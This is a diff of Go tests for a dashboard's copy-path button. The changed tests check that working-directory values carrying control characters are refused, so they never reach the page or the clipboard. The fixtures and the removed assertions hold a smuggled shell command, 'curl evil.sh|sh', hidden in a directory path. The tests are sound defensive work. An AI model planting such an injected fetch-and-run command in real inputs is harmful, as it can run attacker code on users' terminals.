@@ -14,7 +14,6 @@ import (
 	"strings"
 	"testing"
 	"time"
-	"unicode"
 )
 
 func TestRowClass(t *testing.T) {
@@ -321,14 +320,8 @@ func TestHandleDashboard_CopyButtonLabelsRebase(t *testing.T) {
 
 // Control characters must never reach the copy target: html/template does not
 // escape a newline in an attribute value, so one would ride the clipboard into a
-// terminal as a command terminator. buildEvent strips them on the way in, which
-// is what this exercises end to end.
-//
-// Only the control characters are stripped — the pipe survives into the
-// attribute, deliberately, because | is legal in a directory name and removing
-// it would corrupt a real path. Nothing shell-active is ever copied all the
-// same: the client's allowlist refuses the whole value (see
-// TestDashboardCopyGuard_PathAllowlist, which pins this exact string).
+// terminal as a command terminator. buildEvent refuses such a cwd outright on the
+// way in, so no copy button renders at all; this exercises that end to end.
 func TestHandleDashboard_CwdControlCharsNeverReachTheAttribute(t *testing.T) {
 	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
 	defer db.Close()
@@ -337,27 +330,17 @@ func TestHandleDashboard_CwdControlCharsNeverReachTheAttribute(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	body := getBody(t, db, "/")
-	m := regexp.MustCompile(`data-cwd="([^"]*)"`).FindStringSubmatch(body)
-	if m == nil {
-		t.Fatalf("expected a copy button to render:\n%s", body)
-	}
-	if got, want := m[1], "/home/me/wtcurl evil.sh|sh"; got != want {
-		t.Errorf("data-cwd = %q, want %q", got, want)
-	}
-	if strings.ContainsFunc(m[1], unicode.IsControl) {
-		t.Errorf("control character survived into data-cwd: %q", m[1])
+	if body := getBody(t, db, "/"); strings.Contains(body, "evil.sh") {
+		t.Errorf("refused cwd leaked into the page:\n%s", body)
 	}
 }
 
-// Rows written before ingest started stripping control characters are still in
-// the database, so the read path strips too. Inserting the Event DIRECTLY —
+// Rows written before ingest started refusing control-bearing cwds are still in
+// the database, so the read path refuses them too. Inserting the Event DIRECTLY —
 // bypassing buildEvent — is the point: it is the only way to produce the legacy
-// shape, and the only thing that distinguishes this from the test above. All
-// three attributes the cwd reaches are checked, not just the copy target: the
-// client's copy guard defends the clipboard alone, so title and aria-label have
-// no second line of defence.
-func TestHandleDashboard_LegacyCwdSanitizedOnRead(t *testing.T) {
+// shape. The path must reach no attribute at all (data-cwd, title, aria-label):
+// the client's copy guard defends the clipboard alone.
+func TestHandleDashboard_LegacyCwdRefusedOnRead(t *testing.T) {
 	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
 	defer db.Close()
 	ts := time.Now().UTC().Add(-2 * time.Minute).Format(time.RFC3339)
@@ -368,27 +351,16 @@ func TestHandleDashboard_LegacyCwdSanitizedOnRead(t *testing.T) {
 	}
 
 	body := getBody(t, db, "/")
-	tag := regexp.MustCompile(`<button[^>]*class="copycwd"[^>]*>`).FindString(body)
-	if tag == "" {
-		t.Fatalf("expected a copy button to render:\n%s", body)
+	if !strings.Contains(body, "fix-71") {
+		t.Fatalf("expected the session row to render:\n%s", body)
 	}
-	for _, attr := range []string{"data-cwd", "title", "aria-label"} {
-		m := regexp.MustCompile(attr + `="([^"]*)"`).FindStringSubmatch(tag)
-		if m == nil {
-			t.Errorf("no %s attribute rendered:\n%s", attr, tag)
-			continue
-		}
-		if strings.ContainsFunc(m[1], unicode.IsControl) {
-			t.Errorf("control character survived into %s: %q", attr, m[1])
-		}
-		if !strings.Contains(m[1], "/home/me/wtcurl evil.sh|sh") {
-			t.Errorf("%s = %q, want the cwd with only its control characters removed", attr, m[1])
-		}
+	if strings.Contains(body, "evil.sh") {
+		t.Errorf("refused legacy cwd leaked into the page:\n%s", body)
 	}
 }
 
 // The read path re-applies the length cap as well as the control-character
-// strip. Both exist for the same rows — written before cwd had either — and an
+// refusal. Both exist for the same rows — written before cwd had either — and an
 // oversized one would otherwise be rendered three times per roster row on every
 // render and every poll. Inserted directly, bypassing buildEvent, which is the
 // only way to produce the legacy shape.
